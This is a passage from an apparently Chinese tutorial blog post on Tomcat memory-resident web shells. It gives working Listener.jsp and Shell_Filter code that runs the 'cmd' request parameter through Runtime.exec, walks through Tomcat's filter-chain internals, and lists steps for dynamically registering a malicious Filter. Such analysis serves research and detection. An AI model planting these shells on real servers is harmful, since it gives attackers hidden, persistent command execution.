title="完整POC"></a>完整POC</h4><p>Listener.jsp</p><div class="highlight-container" data-rel="Jsp"><figure class="iseeu highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page contentType=<span class="string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="string">&quot;java&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.lang.reflect.Field&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.IOException&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.core.StandardContext&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.connector.Request&quot;</span> %&gt;</span><br><span class="line"> </span><br><span class="line">&lt;%!</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Shell_Listener</span> <span class="keyword">implements</span> <span class="title class_">ServletRequestListener</span> &#123;</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">requestInitialized</span><span class="params">(ServletRequestEvent sre)</span> &#123;</span><br><span class="line">            <span class="type">HttpServletRequest</span> <span class="variable">request</span> <span class="operator">=</span> (HttpServletRequest) sre.getServletRequest();</span><br><span class="line">           <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> request.getParameter(<span class="string">&quot;cmd&quot;</span>);</span><br><span class="line">           <span class="keyword">if</span> (cmd != <span class="literal">null</span>) &#123;</span><br><span class="line">               <span class="keyword">try</span> &#123;</span><br><span class="line">                   Runtime.getRuntime().exec(cmd);</span><br><span class="line">               &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">                   e.printStackTrace();</span><br><span class="line">               &#125; <span class="keyword">catch</span> (NullPointerException n) &#123;</span><br><span class="line">                   n.printStackTrace();</span><br><span class="line">               &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">requestDestroyed</span><span class="params">(ServletRequestEvent sre)</span> &#123;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br><span class="line">&lt;%</span><br><span class="line">    <span class="type">Field</span> <span class="variable">reqF</span> <span class="operator">=</span> request.getClass().getDeclaredField(<span class="string">&quot;request&quot;</span>);</span><br><span class="line">    reqF.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    <span class="type">Request</span> <span class="variable">req</span> <span class="operator">=</span> (Request) reqF.get(request);</span><br><span class="line">    <span class="type">StandardContext</span> <span class="variable">context</span> <span class="operator">=</span> (StandardContext) req.getContext();</span><br><span class="line"> </span><br><span class="line">    <span class="type">Shell_Listener</span> <span class="variable">shell_Listener</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Shell_Listener</span>();</span><br><span class="line">    context.addApplicationEventListener(shell_Listener);</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure></div><p>测试前，先将之前的Listener删除，先直接尝试命令执行，发现弹计算器失败，再访问一下Listener.jsp</p><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/202302010211631.png"                      alt="image-20230201021155544"                ><figcaption>image-20230201021155544</figcaption></figure></p><p>此时Shell_Listener已经被加载进服务器，再次尝试弹计算器</p><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/202302010212384.png"                      alt="image-20230201021249301"                ><figcaption>image-20230201021249301</figcaption></figure></p><h3 id="Filter型"><a href="#Filter型" class="headerlink" title="Filter型"></a>Filter型</h3><p>仿照Listener的思路，实现一个恶意Filter。Filter的调用是通过FilterChain实现的，具体流程如下</p><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/202302010214825.png"                      alt="image-20230201021445758"                ><figcaption>image-20230201021445758</figcaption></figure></p><blockquote><p>只要重写doFilter方法即可</p></blockquote><p>恶意Filter</p><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> javax.servlet.*;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.annotation.WebFilter;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"> </span><br><span class="line"><span class="meta">@WebFilter(&quot;/*&quot;)</span> <span class="comment">//应用到所有路由</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Shell_Filter</span> <span class="keyword">implements</span> <span class="title class_">Filter</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">doFilter</span><span class="params">(ServletRequest request, ServletResponse response, FilterChain chain)</span> <span class="keyword">throws</span> IOException, ServletException &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> request.getParameter(<span class="string">&quot;cmd&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (cmd != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                Runtime.getRuntime().exec(cmd);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (IOException | NullPointerException e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        chain.doFilter(request, response);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/202302010219311.png"                      alt="image-20230201021930234"                ><figcaption>image-20230201021930234</figcaption></figure></p><h4 id="Filter调用分析"><a href="#Filter调用分析" class="headerlink" title="Filter调用分析"></a>Filter调用分析</h4><p>调用栈</p><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">doFilter:<span class="number">11</span>, Shell_Filter (Filter)</span><br><span class="line">internalDoFilter:<span class="number">189</span>, ApplicationFilterChain (org.apache.catalina.core)</span><br><span class="line">doFilter:<span class="number">162</span>, ApplicationFilterChain (org.apache.catalina.core)</span><br><span class="line">invoke:<span class="number">197</span>, StandardWrapperValve (org.apache.catalina.core)</span><br><span class="line">invoke:<span class="number">97</span>, StandardContextValve (org.apache.catalina.core)</span><br><span class="line">invoke:<span class="number">540</span>, AuthenticatorBase (org.apache.catalina.authenticator)</span><br><span class="line">invoke:<span class="number">135</span>, StandardHostValve (org.apache.catalina.core)</span><br><span class="line">invoke:<span class="number">92</span>, ErrorReportValve (org.apache.catalina.valves)</span><br><span class="line">invoke:<span class="number">687</span>, AbstractAccessLogValve (org.apache.catalina.valves)</span><br><span class="line">invoke:<span class="number">78</span>, StandardEngineValve (org.apache.catalina.core)</span><br><span class="line">service:<span class="number">357</span>, CoyoteAdapter (org.apache.catalina.connector)</span><br><span class="line">service:<span class="number">382</span>, Http11Processor (org.apache.coyote.http11)</span><br><span class="line">process:<span class="number">65</span>, AbstractProcessorLight (org.apache.coyote)</span><br><span class="line">process:<span class="number">895</span>, AbstractProtocol$ConnectionHandler (org.apache.coyote)</span><br><span class="line">doRun:<span class="number">1722</span>, NioEndpoint$SocketProcessor (org.apache.tomcat.util.net)</span><br><span class="line">run:<span class="number">49</span>, SocketProcessorBase (org.apache.tomcat.util.net)</span><br><span class="line">runWorker:<span class="number">1191</span>, ThreadPoolExecutor (org.apache.tomcat.util.threads)</span><br><span class="line">run:<span class="number">659</span>, ThreadPoolExecutor$Worker (org.apache.tomcat.util.threads)</span><br><span class="line">run:<span class="number">61</span>, TaskThread$WrappingRunnable (org.apache.tomcat.util.threads)</span><br><span class="line">run:<span class="number">748</span>, Thread (java.lang)</span><br></pre></td></tr></table></figure></div><p>跟进<code>ApplicationFilterChain#internalDoFilter</code></p><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">internalDoFilter</span><span class="params">(ServletRequest request,ServletResponse response)</span> <span class="keyword">throws</span> IOException, ServletException &#123;</span><br><span class="line">        <span class="comment">// Call the next filter if there is one</span></span><br><span class="line">        <span class="keyword">if</span> (pos &lt; n) &#123;</span><br><span class="line">            <span class="type">ApplicationFilterConfig</span> <span class="variable">filterConfig</span> <span class="operator">=</span> filters[pos++];</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="type">Filter</span> <span class="variable">filter</span> <span class="operator">=</span> filterConfig.getFilter(); <span class="comment">//获取Filter</span></span><br><span class="line"> </span><br><span class="line">                <span class="keyword">if</span> (request.isAsyncSupported() &amp;&amp; <span class="string">&quot;false&quot;</span>.equalsIgnoreCase(</span><br><span class="line">                        filterConfig.getFilterDef().getAsyncSupported())) &#123;</span><br><span class="line">                    request.setAttribute(Globals.ASYNC_SUPPORTED_ATTR, Boolean.FALSE);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span>( Globals.IS_SECURITY_ENABLED ) &#123;</span><br><span class="line">                    <span class="keyword">final</span> <span class="type">ServletRequest</span> <span class="variable">req</span> <span class="operator">=</span> request;</span><br><span class="line">                    <span class="keyword">final</span> <span class="type">ServletResponse</span> <span class="variable">res</span> <span class="operator">=</span> response;</span><br><span class="line">                    <span class="type">Principal</span> <span class="variable">principal</span> <span class="operator">=</span></span><br><span class="line">                        ((HttpServletRequest) req).getUserPrincipal();</span><br><span class="line"> </span><br><span class="line">                    Object[] args = <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;req, res, <span class="built_in">this</span>&#125;;</span><br><span class="line">                    SecurityUtil.doAsPrivilege (<span class="string">&quot;doFilter&quot;</span>, filter, classType, args, principal);</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    filter.doFilter(request, response, <span class="built_in">this</span>);<span class="comment">//* doFilter的调用</span></span><br><span class="line">                &#125;</span><br><span class="line">            &#125; </span><br><span class="line">...</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></div><p>查看一下获取Filter的机制，<code>filterConfig</code>是<code>filters</code>数组成员，一个<code>ApplicationFilterConfig</code>实例</p><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> ApplicationFilterConfig[] filters = <span class="keyword">new</span> <span class="title class_">ApplicationFilterConfig</span>[<span class="number">0</span>];</span><br><span class="line"><span class="comment">//...</span></span><br><span class="line"><span class="type">ApplicationFilterConfig</span> <span class="variable">filterConfig</span> <span class="operator">=</span> filters[pos++]</span><br></pre></td></tr></table></figure></div><p>跟进查看一下<code>filters</code>数组的赋值时机,在<code>StandardWrapperValve#invoke()</code>方法中</p><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">void</span> <span class="title function_">invoke</span><span class="params">(Request request, Response response)</span><span class="keyword">throws</span> IOException, ServletException &#123;</span><br><span class="line">  <span class="comment">//...</span></span><br><span class="line">    <span class="comment">// Create the filter chain for this request</span></span><br><span class="line">  <span class="type">ApplicationFilterChain</span> <span class="variable">filterChain</span> <span class="operator">=</span> ApplicationFilterFactory.createFilterChain(request, wrapper, servlet);</span><br></pre></td></tr></table></figure></div><p>跟进<code>createFilterChain</code></p><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> ApplicationFilterChain <span class="title function_">createFilterChain</span><span class="params">(ServletRequest request,</span></span><br><span class="line"><span class="params">            Wrapper wrapper, Servlet servlet)</span> &#123;</span><br><span class="line">        <span class="comment">//...</span></span><br><span class="line">        filterChain = <span class="keyword">new</span> <span class="title class_">ApplicationFilterChain</span>(); <span class="comment">//创建一个空的filterChain</span></span><br><span class="line">        filterChain.setServlet(servlet);</span><br><span class="line">        filterChain.setServletSupportsAsync(wrapper.isAsyncSupported());</span><br><span class="line"> </span><br><span class="line">        <span class="type">StandardContext</span> <span class="variable">context</span> <span class="operator">=</span> (StandardContext) wrapper.getParent();<span class="comment">//得到StandardContext</span></span><br><span class="line">        FilterMap filterMaps[] = context.findFilterMaps();<span class="comment">//获取其中的FilterMaps,里面存储里各Filter的信息</span></span><br><span class="line">        <span class="comment">//...</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">servletName</span> <span class="operator">=</span> wrapper.getName();<span class="comment">//获取名称</span></span><br><span class="line"> </span><br><span class="line">        <span class="keyword">for</span> (FilterMap filterMap : filterMaps) &#123; <span class="comment">//遍历得到对应FilterConfig</span></span><br><span class="line">            <span class="comment">//...</span></span><br><span class="line">            <span class="type">ApplicationFilterConfig</span> <span class="variable">filterConfig</span> <span class="operator">=</span> (ApplicationFilterConfig)</span><br><span class="line">                    context.findFilterConfig(filterMap.getFilterName());</span><br><span class="line">            <span class="comment">//...</span></span><br><span class="line">            filterChain.addFilter(filterConfig);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//...</span></span><br><span class="line">        <span class="keyword">return</span> filterChain;<span class="comment">//将获取到的ApplicationFilterConfig整合返回</span></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></div><p>跟进<code>ApplicationFilterChain#addFilter</code>看一下添加机制</p><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> <span class="title function_">addFilter</span><span class="params">(ApplicationFilterConfig filterConfig)</span> &#123;</span><br><span class="line">        <span class="comment">//防止重复添加</span></span><br><span class="line">        <span class="keyword">for</span>(ApplicationFilterConfig filter:filters) &#123;</span><br><span class="line">            <span class="keyword">if</span>(filter==filterConfig) &#123;</span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (n == filters.length) &#123;</span><br><span class="line">            ApplicationFilterConfig[] newFilters =</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ApplicationFilterConfig</span>[n + INCREMENT];</span><br><span class="line">            System.arraycopy(filters, <span class="number">0</span>, newFilters, <span class="number">0</span>, n);</span><br><span class="line">            filters = newFilters;</span><br><span class="line">        &#125;</span><br><span class="line">        filters[n++] = filterConfig;</span><br><span class="line"> </span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></div><h4 id="Filter动态注册"><a href="#Filter动态注册" class="headerlink" title="Filter动态注册"></a>Filter动态注册</h4><p>通过上述流程可以知道，每次请求的 FilterChain 是动态匹配获取和生成的，如果想添加一个 Filter ，需要在 StandardContext 中 filterMaps 中添加 FilterMap，在 filterConfigs 中添加 ApplicationFilterConfig。这样程序创建时就可以找到添加的 Filter 了。</p><p>这里先说一个前提条件，Filter 配置在配置文件和注解中，在其他代码中如果想要完成注册，主要有以下几种方式：</p><ol><li>使用 ServletContext 的 addFilter&#x2F;createFilter 方法注册；</li><li>使用 ServletContextListener 的 contextInitialized 方法在服务器启动时注册；</li><li>使用 ServletContainerInitializer 的 onStartup 方法在初始化时注册（非动态）。</li></ol><p>这里只讨论第一种，并先关注比较重要的addFilter方法</p><p>在<code>ServletContext</code>接口中有声明了3个<code>addFilter</code>方法，其实现在 <code>org.apache.catalina.core.ApplicationContext#addFilter</code> 中。这里以Tomcat 10.0.23为例</p><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> FilterRegistration.Dynamic <span class="title function_">addFilter</span><span class="params">(String filterName,</span></span><br><span class="line"><span class="params">        String filterClass, Filter filter)</span> <span class="keyword">throws</span> IllegalStateException &#123;</span><br><span class="line">    <span class="keyword">if</span> (filterName == <span class="literal">null</span> || filterName.equals(<span class="string">&quot;&quot;</span>)) &#123;<span class="comment">//filterName不能为空</span></span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalArgumentException</span>(sm.getString(</span><br><span class="line">                <span class="string">&quot;applicationContext.invalidFilterName&quot;</span>, filterName));</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="comment">//这里的context是StandardContext类型</span></span><br><span class="line">    <span class="keyword">if</span> (!context.getState().equals(LifecycleState.STARTING_PREP)) &#123;<span class="comment">//判断context的state是否是程序刚启动的state</span></span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalStateException</span>(</span><br><span class="line">                sm.getString(<span class="string">&quot;applicationContext.addFilter.ise&quot;</span>,</span><br><span class="line">                        getContextPath()));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">FilterDef</span> <span class="variable">filterDef</span> <span class="operator">=</span> context.findFilterDef(filterName);<span class="comment">//在context中根据 filterName 寻找FilterDef对象</span></span><br><span class="line">    <span class="keyword">if</span> (filterDef == <span class="literal">null</span>) &#123;</span><br><span class="line">        filterDef = <span class="keyword">new</span> <span class="title class_">FilterDef</span>();</span><br><span class="line">        filterDef.setFilterName(filterName);</span><br><span class="line">        context.addFilterDef(filterDef);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (filterDef.getFilterName() != <span class="literal">null</span> &amp;&amp;</span><br><span class="line">                filterDef.getFilterClass() != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">//将Filter对象放入FilterDef中</span></span><br><span class="line">    <span class="keyword">if</span> (filter == <span class="literal">null</span>) &#123;</span><br><span class="line">        filterDef.setFilterClass(filterClass);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        filterDef.setFilterClass(filter.getClass().getName());</span><br><span class="line">        filterDef.setFilter(filter);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">ApplicationFilterRegistration</span>(filterDef, context);<span class="comment">//包装FilterDef和context返回</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>从传参可以看出filterDef必要的属性为<code>filter</code>、<code>filterClass</code>以及<code>filterName</code>,动调一下会发现其实filterClass、filterName对应的其实就是web.xml中的<code>&lt;filter&gt;</code>标签。</p><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;filter&gt;</span><br><span class="line">    &lt;filter-name&gt;&lt;/filter-name&gt;</span><br><span class="line">    &lt;filter-class&gt;&lt;/filter-class&gt;</span><br><span class="line">&lt;/filter&gt;</span><br></pre></td></tr></table></figure></div><blockquote><p>并且可以发现<code>ApplicationContext </code>的 <code>addFilter</code> 中将 filter 初始化存在了 <code>StandardContext</code> 的 <code>filterDefs</code> 中,但我们之前分析的<code>FilterChain</code>中的Filter是在<code>StandardContext</code>的<code>filterMaps</code>里获取</p><p>这里可以跟进看一下Filter是怎么被添加到其他参数中的</p></blockquote><p>在 <code>StandardContext</code> 的 <code>filterStart</code> 方法中生成了 <code>filterConfigs</code></p><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">filterStart</span><span class="params">()</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (getLogger().isDebugEnabled()) &#123;</span><br><span class="line">            getLogger().debug(<span class="string">&quot;Starting filters&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// Instantiate and record a FilterConfig for each defined filter</span></span><br><span class="line">        <span class="type">boolean</span> <span class="variable">ok</span> <span class="operator">=</span> <span class="literal">true</span>;</span><br><span class="line">        <span class="keyword">synchronized</span> (filterConfigs) &#123;</span><br><span class="line">            filterConfigs.clear();</span><br><span class="line">            <span class="keyword">for</span> (Entry&lt;String,FilterDef&gt; entry : filterDefs.entrySet()) &#123;<span class="comment">//遍历filterDefs</span></span><br><span class="line">                <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> entry.getKey();</span><br><span class="line">                <span class="keyword">if</span> (getLogger().isDebugEnabled()) &#123;</span><br><span class="line">                    getLogger().debug(<span class="string">&quot; Starting filter &#x27;&quot;</span> + name + <span class="string">&quot;&#x27;&quot;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">try</span> &#123;<span class="comment">//创建ApplicationFilterConfig对象并存入filterConfigs中</span></span><br><span class="line">                    <span class="type">ApplicationFilterConfig</span> <span class="variable">filterConfig</span> <span class="operator">=</span></span><br><span class="line">                            <span class="keyword">new</span> <span class="title class_">ApplicationFilterConfig</span>(<span class="built_in">this</span>, entry.getValue());</span><br><span class="line">                    filterConfigs.put(name, filterConfig);</span><br><span class="line">                &#125; <span class="keyword">catch</span> (Throwable t) &#123;</span><br><span class="line">                    t = ExceptionUtils.unwrapInvocationTargetException(t);</span><br><span class="line">                    ExceptionUtils.handleThrowable(t);</span><br><span class="line">                    getLogger().error(sm.getString(</span><br><span class="line">                            <span class="string">&quot;standardContext.filterStart&quot;</span>, name), t);</span><br><span class="line">                    ok = <span class="literal">false</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> ok;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></div><blockquote><p>完成<code>filterDefs</code>–&gt;<code>filterConfigs</code></p></blockquote><p>在 ApplicationFilterRegistration 的 <code>addMappingForUrlPatterns</code> 中生成了 <code>filterMaps</code></p><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">addMappingForUrlPatterns</span><span class="params">(</span></span><br><span class="line"><span class="params">            EnumSet&lt;DispatcherType&gt; dispatcherTypes, <span class="type">boolean</span> isMatchAfter,</span></span><br><span class="line"><span class="params">            String... urlPatterns)</span> &#123;</span><br><span class="line">        <span class="type">FilterMap</span> <span class="variable">filterMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FilterMap</span>();</span><br><span class="line">        filterMap.setFilterName(filterDef.getFilterName());<span class="comment">//从filterDef获取</span></span><br><span class="line">        <span class="keyword">if</span> (dispatcherTypes != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">for</span> (DispatcherType dispatcherType : dispatcherTypes) &#123;</span><br><span class="line">                filterMap.setDispatcher(dispatcherType.name());<span class="comment">//给dispatcherMapping属性赋值</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (urlPatterns != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">for</span> (String urlPattern : urlPatterns) &#123;</span><br><span class="line">                filterMap.addURLPattern(urlPattern);<span class="comment">//给urlPatterns属性赋值</span></span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (isMatchAfter) &#123;</span><br><span class="line">                context.addFilterMap(filterMap);<span class="comment">//整合filterMap</span></span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                context.addFilterMapBefore(filterMap);<span class="comment">//整合filterMap</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></div><p>fileMap从filterDef中获取了<code>FilterName</code>属性，后续又赋值了<code>urlPatterns</code>,<code>dispatcherMapping</code></p><blockquote><p>可以看到<code>filterMaps</code>的组成部分<code>filterMap</code>的信息是从filterDef中获取</p></blockquote><p>经过上面的分析，我们可以总结出动态添加恶意Filter的思路</p><ol><li>获取StandardContext对象</li><li>创建恶意Filter</li><li>使用FilterDef对Filter进行封装，并添加必要的属性</li><li>创建filterMap类，并将路径和Filtername绑定，然后将其添加到filterMaps中</li><li>使用ApplicationFilterConfig封装filterDef，然后将其添加到filterConfigs中</li></ol><h4 id="完整POC-1"><a href="#完整POC-1" class="headerlink" 